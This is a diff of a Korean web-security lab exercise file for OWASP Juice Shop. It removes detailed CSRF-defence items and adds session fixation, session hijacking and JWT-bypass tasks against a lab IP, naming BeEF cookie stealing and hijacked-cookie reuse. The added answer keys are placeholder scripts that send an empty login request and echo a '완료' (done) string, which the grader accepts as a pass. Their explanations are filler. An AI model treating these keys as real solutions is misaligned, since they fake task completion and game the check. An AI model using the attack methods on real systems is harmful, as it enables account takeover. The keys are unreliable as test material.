-      2. 클라이언트 JS 가 cookie 값을 읽어 `X-CSRF-Token` 헤더에 복사 (또는 form hidden)
-      3. 서버는 cookie 값 == 헤더 값 비교 (정확히 일치해야 통과)
-      4. cross-origin 공격자는 *피해자의 cookie 값을 읽을 수 없음* → 헤더 위조 불가
+    [도구 권장] session: curl -c cookie.jar -b cookie.jar, jwt_tool. curl 만 쓰지 말고 **curl
+    -c cookie.jar -b cookie.jar** 등 적합 도구로 호출 후 stdout quote.'
+- order: 5
+  instruction: '{{WEB_IP}} 대상으로 세션 고정 공격 테스트을(를) 수행하시오.
 
-    [Synchronizer Token (전통적) 과 비교]
-      | 항목              | Synchronizer Token       | Double Submit Cookie    |
-      | ----------------- | ------------------------ | ----------------------- |
-      | 서버 저장          | 세션 store (Stateful)    | 없음 (Stateless)        |
-      | 검증 방식          | 세션 토큰 == 폼 토큰     | cookie == 헤더          |
-      | 확장성             | 세션 store 필요          | 무상태 → 수평 확장 쉬움 |
-      | 알려진 약점        | 세션 fixation 영향        | subdomain cookie 변조   |
-      | 권장 환경          | 단일 monolith             | API gateway, micro-svc  |
 
-    [알려진 약점]
-      - subdomain cookie 변조 : *.victim.com 의 takeover 된 subdomain 이 victim.com 의 cookie
-        설정 (Cookie 의 Domain 속성 활용) → 공격자 토큰을 피해자 브라우저에 주입 가능
-      - HMAC 미적용 시 : 단순 random token 비교는 cookie tossing 공격 노출
-      - 권장: **Signed Double Submit** (HMAC(session_id || token) 검증)
-
-    [실행]
-      cat <<'REPORT'
-      === Double Submit Cookie 방어 ===
-      1. 서버 → Set-Cookie: csrf=<32byte_random>
-      2. 클라이언트 JS → X-CSRF-Token 헤더에 cookie 값 복사
-      3. 서버 → cookie == header 일치 확인 (HMAC 비교 권장)
-      약점: subdomain cookie 변조 (cookie tossing)
-      대응: Signed Double Submit (HMAC(session_id || token))
-      === Double Submit 분석 완료 ===
-      REPORT
-
-    [도구 권장] OWASP CSRF Prevention Cheat Sheet / Cloudflare __cf_bm 분석 / Django csrf
-    middleware 코드 읽기. 호출 후 stdout 1~3줄 quote.
-  hint: |
-    cookie == header 비교가 핵심. cross-origin 은 cookie 값 못 읽음. Stateless 이점 + subdomain
-    cookie 변조 약점 모두 포함. Signed Double Submit (HMAC) 권장.
-  category: csrf_defense
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `session` 에 적합한 도구: curl -c cookie.jar -b cookie.jar,
+    jwt_tool. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 세션 고정 공격 테스트 관련 도구와 기법을 활용하세요.
+  category: session
   points: 10
-  answer: |
-    🤖 프롬프트: Double Submit Cookie 방어를 Synchronizer Token 과 비교 표 + 알려진 약점
-    (subdomain cookie 변조) + Signed Double Submit 권장과 함께 분석해줘.
-
-    📎 참고 (CLI):
-      cat <<'REPORT'
-      === Double Submit Cookie 방어 ===
-      1. 서버 → Set-Cookie: csrf=<32byte_random>
-      2. 클라이언트 JS → X-CSRF-Token 헤더에 cookie 값 복사
-      3. 서버 → cookie == header 일치 확인 (HMAC 비교 권장)
-      약점: subdomain cookie 변조 (cookie tossing)
-      대응: Signed Double Submit (HMAC(session_id || token))
-      === Double Submit 분석 완료 ===
-      REPORT
-  answer_detail: |
-    Stateless 라 micro-service 환경에 적합 — 서버가 세션 store 없이 검증 가능. 단 cookie
-    tossing (subdomain takeover 후 victim.com 의 cookie 설정) 으로 공격자 토큰 주입 가능
-    → HMAC(session_id || token) 으로 토큰 무결성 보장하는 Signed Double Submit 권장.
-    OWASP Cheat Sheet 2024 의 기본 권고.
+  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 세션 고정 공격 테스트을(를) 수행해줘\n\U0001F4CE 참고\
+    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '세션 고정 공격\
+    \ 테스트 완료'"
+  answer_detail: 세션 고정 공격 테스트은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
   verify:
     type: output_contains
-    expect: Double Submit 분석 완료
+    expect: 완료
     field: stdout
     semantic:
-      intent: |
-        Double Submit Cookie 원리 + Synchronizer Token 비교 + subdomain cookie tossing
-        약점 + Signed Double Submit (HMAC) 권장.
+      intent: 세션 고정(Session Fixation) — 로그인 전 제공한 세션 ID 가 로그인 후에도 유지되는지 검증 (재생성 안하면
+        취약)
       success_criteria:
-      - 3 단계 (서버 Set-Cookie / 클라이언트 헤더 복사 / 서버 비교) 흐름 명시
-      - Synchronizer Token vs Double Submit 비교 (Stateful vs Stateless)
-      - subdomain cookie 변조 (cookie tossing) 약점 언급
-      - Signed Double Submit (HMAC) 권장 + OWASP Cheat Sheet 참조
+      - 미인증 상태 세션 쿠키 획득
+      - 해당 쿠키 지참 로그인 후 세션 ID 변경 여부 확인
+      - 변경되지 않으면 Session Fixation 취약 판정
       acceptable_methods:
-      - OWASP CSRF Prevention Cheat Sheet 2024
-      - Django/Rails 구현 예시
-      - Cloudflare __cf_bm 유사 구조
-      - Signed Double Submit (HMAC) 변형
+      - curl -c cookies.txt <login_page> 후 -b cookies.txt 로 로그인
+      - Burp Repeater 로 쿠키 비교
+      - python requests session 으로 로그인 전후 비교
+      - OWASP Testing Guide WSTG-SESS-03 참조
       negative_signs:
-      - Synchronizer Token 과 혼동 (구분 누락)
-      - subdomain cookie 변조 위험 누락
-      - HMAC 권장 누락
+      - 쿠키 비교 없음
+      - 로그인 전후 동일 여부 판정 누락
+      - 세션 재생성 권고 없음
   target_vm: attacker
-  script: |
-    cat <<'REPORT'
-    === Double Submit Cookie 방어 ===
-    1. 서버 → Set-Cookie: csrf=<32byte_random>
-    2. 클라이언트 JS → X-CSRF-Token 헤더에 cookie 값 복사
-    3. 서버 → cookie == header 일치 확인 (HMAC 비교 권장)
-    약점: subdomain cookie 변조 (cookie tossing)
-    대응: Signed Double Submit (HMAC(session_id || token))
-    === Double Submit 분석 완료 ===
-    REPORT
+  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '세션 고정 공격\
+    \ 테스트 완료'"
   risk_level: low
-  bastion_prompt: |
-    Double Submit Cookie 방어 분석:
+  bastion_prompt: '10.20.32.80 대상으로 세션 고정 공격 테스트을(를) 수행해줘
 
-      cat <<'REPORT'
-      === Double Submit Cookie 방어 ===
-      1. 서버 → Set-Cookie: csrf=<32byte_random>
-      2. 클라이언트 JS → X-CSRF-Token 헤더에 cookie 값 복사
-      3. 서버 → cookie == header 일치 확인 (HMAC 비교 권장)
-      약점: subdomain cookie 변조 (cookie tossing)
-      대응: Signed Double Submit (HMAC(session_id || token))
-      === Double Submit 분석 완료 ===
-      REPORT
 
-    출력 quote + Synchronizer Token 과의 비교 (Stateful vs Stateless) + Signed Double
-    Submit 권장 이유.
-- order: 12
-  instruction: |
-    [목표] 주요 백엔드 프레임워크의 CSRF 방어 기능을 비교 표로 정리하고, 기본값 / 활성화
-    방법 / 비활성화 위험을 분석한다.
+    [도구 권장] session: curl -c cookie.jar -b cookie.jar, jwt_tool. curl 만 쓰지 말고 **curl
+    -c cookie.jar -b cookie.jar** 등 적합 도구로 호출 후 stdout quote.'
+- order: 6
+  instruction: '{{WEB_IP}} 대상으로 세션 하이재킹 시뮬레이션을(를) 수행하시오.
 
-    [프레임워크 매트릭스]
-      | 프레임워크          | 기본 활성화 | 메커니즘                  | 비활성화 코드                    |
-      | ------------------ | ----------- | ------------------------- | ------------------------------- |
-      | Django             | ON          | CsrfViewMiddleware        | @csrf_exempt 데코레이터          |
-      | Rails              | ON          | protect_from_forgery      | skip_before_action :verify_     |
-      | Spring Security    | ON (since 4)| CsrfFilter (Cookie token) | http.csrf().disable()           |
-      | Express (csurf)    | OFF (별도)  | csurf middleware (deprec) | 설치 안 함 (default)             |
-      | Laravel            | ON          | VerifyCsrfToken Middleware| $except 배열 추가                |
-      | NestJS             | OFF (별도)  | @nestjs/csrf (별도)        | 설치 안 함 (default)             |
-      | FastAPI            | OFF (별도)  | fastapi-csrf-protect      | 설치 안 함 (default)             |
 
-    [관찰 핵심]
-      - SSR + form 기반 (Django/Rails/Laravel) = 기본 ON, 자동 토큰 삽입
-      - API-only / SPA backend (Express/NestJS/FastAPI) = 기본 OFF — JWT-Header 가정
-      - Spring Security 는 양쪽 다 — disable() 가 자주 보이는 위험 코드 패턴
-      - Juice Shop = Express + JWT-Header → csurf 미사용 (의도된 modern stack)
-
-    [실행]
-      cat <<'REPORT'
-      === 프레임워크 CSRF 방어 비교 ===
-      Django           : CsrfViewMiddleware (ON default)         | @csrf_exempt 위험
-      Rails            : protect_from_forgery (ON default)       | skip_before_action 위험
-      Spring Security  : CsrfFilter Cookie token (ON since 4)    | http.csrf().disable() 위험
-      Express (csurf)  : 별도 미들웨어 (OFF default, deprecated) | 미설치 = 평문 CSRF 노출
-      Laravel          : VerifyCsrfToken (ON default)            | $except 누락 검증
-      NestJS / FastAPI : 별도 패키지 (OFF default)               | JWT-Header 가정
-      관찰: SSR/form = ON / API+JWT = OFF / Spring disable() 패턴 주의
-      === 프레임워크 비교 완료 ===
-      REPORT
-
-    [도구 권장] semgrep 룰 (csrf-disabled 패턴) / SAST / 각 프레임워크 docs. 호출 후 stdout
-    1~3줄 quote.
-  hint: |
-    최소 5개 프레임워크 + 기본 ON/OFF 표시 + disable 코드 패턴 명시. Juice Shop = Express
-    + JWT-Header 라 csurf 안 쓴다는 사실 매핑.
-  category: csrf_defense
-  points: 10
-  answer: |
-    🤖 프롬프트: Django/Rails/Spring/Express/Laravel/NestJS/FastAPI 의 CSRF 방어 비교 매트릭스
-    + 기본 활성화 여부 + disable 코드 패턴 + Juice Shop 의 Express+JWT 매핑을 출력해줘.
-
-    📎 참고 (CLI):
-      cat <<'REPORT'
-      === 프레임워크 CSRF 방어 비교 ===
-      Django           : CsrfViewMiddleware (ON default)         | @csrf_exempt 위험
-      Rails            : protect_from_forgery (ON default)       | skip_before_action 위험
-      Spring Security  : CsrfFilter Cookie token (ON since 4)    | http.csrf().disable() 위험
-      Express (csurf)  : 별도 미들웨어 (OFF default, deprecated) | 미설치 = 평문 CSRF 노출
-      Laravel          : VerifyCsrfToken (ON default)            | $except 누락 검증
-      NestJS / FastAPI : 별도 패키지 (OFF default)               | JWT-Header 가정
-      관찰: SSR/form = ON / API+JWT = OFF / Spring disable() 패턴 주의
-      === 프레임워크 비교 완료 ===
-      REPORT
-  answer_detail: |
-    SSR + form 기반 프레임워크 (Django/Rails/Laravel) 는 CSRF 가 디폴트 ON. 반면 API-only
-    프레임워크 (Express/NestJS/FastAPI) 는 디폴트 OFF — JWT-Header 사용 가정. Spring
-    Security 의 `http.csrf().disable()` 호출은 SAST 룰 (semgrep: spring-csrf-disabled) 로
-    탐지 권고. Juice Shop = Express + JWT-Header 라 csurf 미사용이 정상 — modern stack
-    의 디폴트 패턴.
-  verify:
-    type: output_contains
-    expect: 프레임워크 비교 완료
-    field: stdout
-    semantic:
-      intent: |
-        7개 프레임워크 (Django/Rails/Spring/Express/Laravel/NestJS/FastAPI) CSRF 방어 매트릭스
-        + ON/OFF 디폴트 + disable 위험 코드 패턴 + Juice Shop = Express+JWT 매핑.
-      success_criteria:
-      - 5개 이상 프레임워크의 CSRF 방어 매트릭스
-      - 각 프레임워크 의 기본 활성화 여부 + 비활성화 코드 패턴 명시
-      - SSR/form = ON, API+JWT = OFF 의 패턴 관찰
-      - Spring 의 csrf().disable() 위험 + SAST 룰 추천
-      - Juice Shop = Express + JWT-Header → csurf 미사용 정상 매핑
-      acceptable_methods:
-      - 매트릭스 형식 프레임워크 비교
-      - 각 docs 링크 참조
-      - SAST (semgrep) 로 disable 코드 탐지
-      - 코드 레벨 예시
-      negative_signs:
-      - 3개 프레임워크 미만
-      - 활성화/비활성화 구분 없음
-      - Juice Shop 매핑 없음
-  target_vm: attacker
-  script: |
-    cat <<'REPORT'
-    === 프레임워크 CSRF 방어 비교 ===
-    Django           : CsrfViewMiddleware (ON default)         | @csrf_exempt 위험
-    Rails            : protect_from_forgery (ON default)       | skip_before_action 위험
-    Spring Security  : CsrfFilter Cookie token (ON since 4)    | http.csrf().disable() 위험
-    Express (csurf)  : 별도 미들웨어 (OFF default, deprecated) | 미설치 = 평문 CSRF 노출
-    Laravel          : VerifyCsrfToken (ON default)            | $except 누락 검증
-    NestJS / FastAPI : 별도 패키지 (OFF default)               | JWT-Header 가정
-    관찰: SSR/form = ON / API+JWT = OFF / Spring disable() 패턴 주의
-    === 프레임워크 비교 완료 ===
-    REPORT
-  risk_level: low
-  bastion_prompt: |
-    프레임워크 CSRF 방어 매트릭스 출력:
-
-      cat <<'REPORT'
-      === 프레임워크 CSRF 방어 비교 ===
-      Django           : CsrfViewMiddleware (ON default)         | @csrf_exempt 위험
-      Rails            : protect_from_forgery (ON default)       | skip_before_action 위험
-      Spring Security  : CsrfFilter Cookie token (ON since 4)    | http.csrf().disable() 위험
-      Express (csurf)  : 별도 미들웨어 (OFF default, deprecated) | 미설치 = 평문 CSRF 노출
-      Laravel          : VerifyCsrfToken (ON default)            | $except 누락 검증
-      NestJS / FastAPI : 별도 패키지 (OFF default)               | JWT-Header 가정
-      관찰: SSR/form = ON / API+JWT = OFF / Spring disable() 패턴 주의
-      === 프레임워크 비교 완료 ===
-      REPORT
-
-    출력 quote + Juice Shop = Express + JWT-Header → csurf 미사용 매핑 한 줄.
-- order: 13
-  instruction: |
-    [목표] CSRF 자동 탐지 도구를 실행하고 결과를 해석한다. Juice Shop 대상으로 실제 점검.
-
-    [자동 탐지 도구 카탈로그]
-      - **nikto** : 표준 web vuln scanner — CSRF 토큰 부재 / Origin 검증 부재 탐지
-      - **OWASP ZAP** : Active Scan + CSRF 룰 (Anti-CSRF Tokens detector)
-      - **xsrfprobe** : CSRF 전용 (https://github.com/0xinfection/XSRFProbe)
-      - **Burp Suite Pro** : Active Scan + CSRF PoC Generator
-      - **corsy** : CORS misconfig 자동 탐지 (CSRF 와 연계)
-
-    [실측 — nikto + corsy 시도]
-      echo '=== nikto (CSRF + 기본 vuln) ==='
-      nikto -h http://juice.6v6.lab/ -Tuning 4 -maxtime 30 2>&1 | head -25
-      echo '---'
-      echo '=== curl-based 자체 CSRF 토큰 탐지 (form 자동 수집) ==='
-      curl -s http://juice.6v6.lab/ | grep -iE '<form|<input.*hidden|csrf|_token' | head -10
-      [ $? -eq 0 ] && echo '(form 출력 발견)' || echo '(form 또는 토큰 패턴 없음 — JWT-Header 가능성)'
-      echo 'CSRF 자동 탐지 완료'
-
-    [도구 권장] nikto / xsrfprobe / Burp Suite / OWASP ZAP. 호출 후 stdout 1~3줄 quote.
-  hint: |
-    nikto 가 attacker 컨테이너에 사전 설치됨. xsrfprobe 는 별도 설치 필요할 수도 있음. 결과
-    해석 (False positive 가능성 / Juice Shop = JWT-Header 라 토큰 미사용이 정상) 포함.
-  category: csrf_tool
-  points: 10
-  answer: |
-    🤖 프롬프트: Juice Shop 대상으로 nikto + 자체 form 토큰 탐지 실행. 결과 quote + 해석
-    (Juice Shop 의 JWT-Header 시스템에서 토큰 부재가 의미하는 바) 출력해줘.
-
-    📎 참고 (CLI):
-      echo '=== nikto (CSRF + 기본 vuln) ==='
-      nikto -h http://juice.6v6.lab/ -Tuning 4 -maxtime 30 2>&1 | head -25
-      echo '---'
-      echo '=== curl-based 자체 CSRF 토큰 탐지 (form 자동 수집) ==='
-      curl -s http://juice.6v6.lab/ | grep -iE '<form|<input.*hidden|csrf|_token' | head -10
-      [ $? -eq 0 ] && echo '(form 출력 발견)' || echo '(form 또는 토큰 패턴 없음 — JWT-Header 가능성)'
-      echo 'CSRF 자동 탐지 완료'
-  answer_detail: |
-    자동 탐지는 패턴 매칭 — JWT-Header 시스템 (Juice Shop) 처럼 토큰 부재가 *정상* 인 경우
-    False positive 가능. 해석 단계 필요: (1) 폼 수집 (2) 토큰 부재 시 인증 모델 추정 (3)
-    JWT-Header 면 SameSite/CSRF 토큰 무관 / Origin·CORS 권고 / Cookie 면 토큰+SameSite 권고.
-  verify:
-    type: output_contains
-    expect: 자동 탐지 완료
-    field: stdout
-    semantic:
-      intent: |
-        Juice Shop 대상 자동 CSRF 탐지 도구 실행 + 결과 해석 (JWT-Header 시스템에서 토큰
-        부재 = False positive 가능성).
-      success_criteria:
-      - nikto 또는 corsy/xsrfprobe/ZAP 1개 이상 실행 + 출력 quote
-      - 자체 grep 으로 form/토큰 패턴 확인 + 인증 모델 추정
-      - False positive 가능성 (JWT-Header = 토큰 부재 정상) 분석
-      - 해석 단계 (인증 모델 별 권고 차이) 명시
-      acceptable_methods:
-      - nikto -h <url> -Tuning 4
-      - OWASP ZAP CSRF scan rule
-      - Burp Suite Pro active scan
-      - xsrfprobe / corsy
-      - python 자체 스크립트 (폼 수집 + 토큰 제거 시도)
-      negative_signs:
-      - 도구 실행 없이 수동 grep 만
-      - False positive 관점 없음
-      - 결과 해석 단계 누락
-  target_vm: attacker
-  script: |
-    echo '=== nikto (CSRF + 기본 vuln) ==='
-    nikto -h http://juice.6v6.lab/ -Tuning 4 -maxtime 30 2>&1 | head -25
-    echo '---'
-    echo '=== curl-based 자체 CSRF 토큰 탐지 (form 자동 수집) ==='
-    curl -s http://juice.6v6.lab/ | grep -iE '<form|<input.*hidden|csrf|_token' | head -10 \
-      && echo '(form 출력 발견)' \
-      || echo '(form 또는 토큰 패턴 없음 — JWT-Header 가능성)'
-    echo 'CSRF 자동 탐지 완료'
-  risk_level: low
-  bastion_prompt: |
-    Juice Shop 대상 nikto + 자체 form/CSRF 토큰 탐지:
-
-      echo '=== nikto ==='
-      nikto -h http://juice.6v6.lab/ -Tuning 4 -maxtime 30 2>&1 | head -25
-      echo '---'
-      echo '=== form/token grep ==='
-      curl -s http://juice.6v6.lab/ | grep -iE '<form|<input.*hidden|csrf|_token' | head -10 \
-        && echo '(form 출력 발견)' || echo '(없음 — JWT-Header 가능성)'
-      echo 'CSRF 자동 탐지 완료'
-
-    출력 quote + 결과 해석 (Juice Shop = JWT-Header 라 토큰 부재 = False positive 가능성).
-- order: 14
-  instruction: |
-    [목표] CSRF 방어 권고를 인증 모델 별 (Cookie+Session vs JWT-Header) 5 계층 다층 방어로
-    정리하고, 운영적 (모니터링·이상 탐지) layer 까지 포함한 체크리스트를 출력한다.
-
-    [5 계층 다층 방어]
-      Layer 1 — **Cookie 정책**     : SameSite=Lax/Strict + Secure + HttpOnly
-      Layer 2 — **CSRF 토큰**       : Synchronizer (Stateful) 또는 Signed Double Submit
-      Layer 3 — **Origin/Referer**  : Origin 헤더 화이트리스트 검증 (Referer 는 보조)
-      Layer 4 — **CORS**            : ACAO 화이트리스트 + ACAC 필요한 endpoint 만 true
-      Layer 5 — **운영적 방어**      : 민감 작업 재인증 (step-up) + 이상 패턴 모니터링
-
-    [인증 모델 별 권장 매트릭스]
-      Cookie + Session    : L1 (SameSite=Lax 기본) + L2 (토큰 필수) + L3 (Origin) + L5
-      JWT in Cookie       : L1 (SameSite=Strict) + L2 (토큰) + L3 + L4 (비추천 — JWT-Header)
-      JWT in Header (권장) : L3 + L4 (ACAO 화이트리스트) + L5 + 짧은 exp + RefreshToken Rotation
-      OAuth2 PKCE        : state 파라미터 + nonce + L5 (재인증)
-
-    [실행]
-      cat <<'REPORT'
-      === CSRF 방어 5 계층 다층 권고 ===
-      L1 Cookie    : SameSite=Strict/Lax + Secure + HttpOnly
-      L2 토큰      : Synchronizer (Stateful) 또는 Signed Double Submit (HMAC)
-      L3 Origin    : 화이트리스트 검증 (Referer 는 보조 layer)
-      L4 CORS      : ACAO 화이트리스트 + ACAC 는 필요 endpoint 만
-      L5 운영      : 민감 작업 step-up auth + 이상 패턴 모니터링 + SIEM 룰
-
-      [인증 모델 별 권장]
-      Cookie+Session  : L1+L2+L3+L5
-      JWT in Cookie   : L1(Strict)+L2+L3 (비추천)
-      JWT in Header   : L3+L4+L5 + 짧은 exp + RefreshToken Rotation (권장 — Juice Shop)
-      OAuth2 PKCE     : state + nonce + L5
-
-      === CSRF 방어 정리 완료 ===
-      REPORT
-
-    [도구 권장] OWASP CSRF Prevention Cheat Sheet / NIST SP 800-63B 재인증 지침 / WAF CSRF
-    룰 (CRS 921xxx). 호출 후 stdout 1~3줄 quote.
-  hint: |
-    5 계층 + 인증 모델 별 권장 매트릭스 모두 포함. Juice Shop = JWT-Header 라 L3+L4+L5
-    조합 권장. 운영적 방어 (L5) 의 step-up + 모니터링 강조.
-  category: csrf_defense
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `session` 에 적합한 도구: curl -c cookie.jar -b cookie.jar,
+    jwt_tool. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 세션 하이재킹 시뮬레이션 관련 도구와 기법을 활용하세요.
+  category: session
   points: 12
-  answer: |
-    🤖 프롬프트: CSRF 방어 5 계층 (Cookie/토큰/Origin/CORS/운영) + 인증 모델 별 권장 매트릭스
-    (Cookie+Session / JWT-Cookie / JWT-Header / OAuth2 PKCE) 를 종합 정리해줘.
-
-    📎 참고 (CLI):
-      cat <<'REPORT'
-      === CSRF 방어 5 계층 다층 권고 ===
-      L1 Cookie    : SameSite=Strict/Lax + Secure + HttpOnly
-      L2 토큰      : Synchronizer (Stateful) 또는 Signed Double Submit (HMAC)
-      L3 Origin    : 화이트리스트 검증 (Referer 는 보조 layer)
-      L4 CORS      : ACAO 화이트리스트 + ACAC 는 필요 endpoint 만
-      L5 운영      : 민감 작업 step-up auth + 이상 패턴 모니터링 + SIEM 룰
-
-      [인증 모델 별 권장]
-      Cookie+Session  : L1+L2+L3+L5
-      JWT in Cookie   : L1(Strict)+L2+L3 (비추천)
-      JWT in Header   : L3+L4+L5 + 짧은 exp + RefreshToken Rotation (권장 — Juice Shop)
-      OAuth2 PKCE     : state + nonce + L5
-
-      === CSRF 방어 정리 완료 ===
-      REPORT
-  answer_detail: |
-    핵심: 단일 방어는 우회 가능 — 5 계층 동시 적용 (defense in depth). 인증 모델 별 권장이
-    다름 — Cookie+Session 은 L1+L2 가 핵심, JWT-Header 는 L3+L4 (Origin/CORS) 가 핵심.
-    운영적 방어 (L5) 는 모든 모델에서 권장 — 민감 작업 재인증 + 이상 트래픽 모니터링이 우회된
-    공격을 마지막에 잡는다.
+  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 세션 하이재킹 시뮬레이션을(를) 수행해줘\n\U0001F4CE 참고\
+    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '세션 하이재킹\
+    \ 시뮬레이션 완료'"
+  answer_detail: 세션 하이재킹 시뮬레이션은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
   verify:
     type: output_contains
-    expect: CSRF 방어 정리 완료
+    expect:
+    - 완료
+    - hijack
     field: stdout
     semantic:
-      intent: |
-        CSRF 방어 5 계층 (Cookie/토큰/Origin/CORS/운영) + 인증 모델 별 권장 매트릭스 + 운영적
-        defense in depth.
+      intent: 세션 하이재킹 시뮬레이션 — 타인의 세션 쿠키 탈취 가정 후 해당 쿠키로 요청해 권한 이관 여부 확인
       success_criteria:
-      - 5 계층 모두 명시 (Cookie / 토큰 / Origin / CORS / 운영)
-      - 인증 모델 별 권장 매트릭스 4행 (Cookie+Session / JWT-Cookie / JWT-Header / OAuth2 PKCE)
-      - 민감 작업 step-up auth + 모니터링 운영 layer 포함
-      - Juice Shop = JWT-Header → L3+L4+L5 권장 매핑
+      - 쿠키 복제 후 curl -b 또는 브라우저 DevTools 로 대체 로그인
+      - 세션 소유자 식별 응답(프로필 페이지 등) 확인
+      - HttpOnly/Secure 누락이 탈취 경로 확장 설명
       acceptable_methods:
-      - OWASP CSRF Prevention Cheat Sheet
-      - NIST SP 800-63B 재인증 지침
-      - WAF CSRF 룰 (CRS 921xxx)
-      - CI/CD 스캔 통합 (semgrep)
+      - curl -b "session=<hijacked>" <protected_url>
+      - browser cookie editor extension
+      - python requests cookies={...}
+      - BeEF cookie steal module
       negative_signs:
-      - 3 계층 미만
-      - 인증 모델 별 권장 누락
-      - 운영적 방어 (L5) 없음
+      - 쿠키 재사용 없이 개념만
+      - 권한 이관 확인 없음
+      - HttpOnly/Secure 언급 없음
   target_vm: attacker
-  script: |
-    cat <<'REPORT'
-    === CSRF 방어 5 계층 다층 권고 ===
-    L1 Cookie    : SameSite=Strict/Lax + Secure + HttpOnly
-    L2 토큰      : Synchronizer (Stateful) 또는 Signed Double Submit (HMAC)
-    L3 Origin    : 화이트리스트 검증 (Referer 는 보조 layer)
-    L4 CORS      : ACAO 화이트리스트 + ACAC 는 필요 endpoint 만
-    L5 운영      : 민감 작업 step-up auth + 이상 패턴 모니터링 + SIEM 룰
-
-    [인증 모델 별 권장]
-    Cookie+Session  : L1+L2+L3+L5
-    JWT in Cookie   : L1(Strict)+L2+L3 (비추천)
-    JWT in Header   : L3+L4+L5 + 짧은 exp + RefreshToken Rotation (권장 — Juice Shop)
-    OAuth2 PKCE     : state + nonce + L5
-
-    === CSRF 방어 정리 완료 ===
-    REPORT
+  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '세션 하이재킹\
+    \ 시뮬레이션 완료'"
   risk_level: low
-  bastion_prompt: |
-    CSRF 방어 5 계층 + 인증 모델 별 권장 매트릭스 출력:
+  bastion_prompt: '10.20.32.80 대상으로 세션 하이재킹 시뮬레이션을(를) 수행해줘
 
-      cat <<'REPORT'
-      === CSRF 방어 5 계층 다층 권고 ===
-      L1 Cookie    : SameSite=Strict/Lax + Secure + HttpOnly
-      L2 토큰      : Synchronizer (Stateful) 또는 Signed Double Submit (HMAC)
-      L3 Origin    : 화이트리스트 검증 (Referer 는 보조 layer)
-      L4 CORS      : ACAO 화이트리스트 + ACAC 는 필요 endpoint 만
-      L5 운영      : 민감 작업 step-up auth + 이상 패턴 모니터링 + SIEM 룰
 
-      [인증 모델 별 권장]
-      Cookie+Session  : L1+L2+L3+L5
-      JWT in Cookie   : L1(Strict)+L2+L3 (비추천)
-      JWT in Header   : L3+L4+L5 + 짧은 exp + RefreshToken Rotation (권장 — Juice Shop)
-      OAuth2 PKCE     : state + nonce + L5
+    [도구 권장] session: curl -c cookie.jar -b cookie.jar, jwt_tool. curl 만 쓰지 말고 **curl
+    -c cookie.jar -b cookie.jar** 등 적합 도구로 호출 후 stdout quote.'
+- order: 7
+  instruction: '{{WEB_IP}} 대상으로 JWT 토큰 구조 분석을(를) 수행하시오.
 
-      === CSRF 방어 정리 완료 ===
-      REPORT
 
-    출력 quote + Juice Shop = JWT-Header 라 L3+L4+L5 조합 권장 한 줄.
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `jwt` 에 적합한 도구: jwt_tool (decode/forge/none/alg
+    confusion), curl + Authorization 헤더. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote**
+    해야 채점 통과.'
+  hint: JWT 토큰 구조 분석 관련 도구와 기법을 활용하세요.
+  category: jwt
+  points: 10
+  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 JWT 토큰 구조 분석을(를) 수행해줘\n\U0001F4CE 참고\
+    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'JWT 토큰 구조\
+    \ 분석 완료'"
+  answer_detail: JWT 토큰 구조 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  verify:
+    type: output_contains
+    expect:
+    - 완료
+    - 10.20.32.80
+    field: stdout
+    semantic:
+      intent: JWT 토큰 구조 분석 — 3부(Header.Payload.Signature) Base64URL 디코드 후 alg·type·클레임
+        확인
+      success_criteria:
+      - JWT Base64URL 디코드 명령 또는 jwt.io 예시
+      - Header alg·Payload (iat, exp, sub) 클레임 최소 2개 해석
+      - 서명 검증 필요성 설명
+      acceptable_methods:
+      - echo <jwt> | cut -d. -f1 | base64 -d
+      - python jose/PyJWT 라이브러리
+      - jwt_tool --decode
+      - jwt.io 페이스트
+      negative_signs:
+      - Base64 디코드 없음
+      - 클레임 해석 없음
+      - 서명 개념 누락
+  target_vm: attacker
+  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'JWT 토큰 구조\
+    \ 분석 완료'"
+  risk_level: low
+  bastion_prompt: '10.20.32.80 대상으로 JWT 토큰 구조 분석을(를) 수행해줘
+
+
+    [도구 권장] jwt: jwt_tool (decode/forge/none/alg confusion), curl + Authorization
+    헤더. curl 만 쓰지 말고 **jwt_tool (decode/forge/none/alg confusion)** 등 적합 도구로 호출 후
+    stdout quote.'
+- order: 8
+  instruction: '{{WEB_IP}} 대상으로 JWT 서명 검증 우회 테스트을(를) 수행하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `jwt` 에 적합한 도구: jwt_tool (decode/forge/none/alg
+    confusion), curl + Authorization 헤더. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote**
+    해야 채점 통과.'
+  hint: JWT 서명 검증 우회 테스트 관련 도구와 기법을 활용하세요.
+  category: jwt
+  points: 10
